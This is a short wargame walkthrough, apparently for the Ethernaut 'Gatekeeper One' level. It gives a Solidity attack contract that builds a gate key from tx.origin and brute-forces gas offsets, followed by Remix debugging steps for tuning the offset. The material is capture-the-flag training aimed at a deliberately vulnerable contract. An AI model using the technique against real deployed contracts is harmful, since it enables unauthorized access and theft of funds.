Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.6.4;

contract Exploit {
    function exploit(address _who, uint adjust) public {
        bytes8 key = bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF);

        bool s;
        for (uint i = 0; i < adjust; i++){
          (s,) = _who.call{gas: adjust + (8191 * 3) - i}(abi.encodeWithSignature("enter(bytes8)", key));
          if (s){
            break;
          }
        }
        if (!s){
          revert();
        }
    }
}
```
Call exploit() sending your contract instance, and an adjust value (helpful for change between networks, addresses and solc versions)

To find a good adjust value:
  - deploy this contract and the gatekeeper to a local vm
  - try with adjust = 0
  - debug the transaction and go to the first opcode where remix highlights ```msg.gas % 8191```
  - grab the remaining gas value
  - go back until execution step inside gatekeeper is 0
  - grab the remaining gas value
  - subtract one from the other
  - add an error margin (about 50 gas)
